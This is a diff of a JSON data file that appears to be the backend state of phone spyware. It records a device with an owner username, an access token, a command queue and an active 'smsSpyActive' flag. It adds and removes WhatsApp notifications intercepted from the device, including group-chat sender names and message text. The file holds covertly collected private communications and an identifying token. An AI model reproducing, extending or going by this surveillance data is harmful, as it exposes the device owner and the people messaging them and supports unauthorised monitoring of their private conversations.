@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003676403,
+    "lastSeen": 1776003679505,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎2 pesan baru",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003681345
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "~ kiwaa inii: INI PADA KENAPACOK",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003679218
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨: ~ kiwaa inii",
+        "content": "INI PADA KENAPACOK",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003678451
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (9 pesan): ~ 𝒜𝓋𝑒𝓁𝓎𝓃 𝒢𝓇𝒾𝓈𝑒𝓁𝒹𝒶 𝒱𝒶𝓁𝑒𝓇𝓎",
@@ -4099,30 +4123,6 @@
         "time": "12/04 08:12",
         "pkg": "com.whatsapp",
         "receivedAt": 1775956338857
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Mengunduh 1 video",
-        "content": "dari ALL MENTAHAN KKHANLUVYU",
-        "time": "12/04 08:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775956336411
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Mengunduh 1 video",
-        "content": "dari ALL MENTAHAN KKHANLUVYU",
-        "time": "12/04 08:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775956330917
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Mengunduh 1 video",
-        "content": "dari ALL MENTAHAN KKHANLUVYU",
-        "time": "12/04 08:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775956325973
       }
     ],
     "galleryPhotos": [],
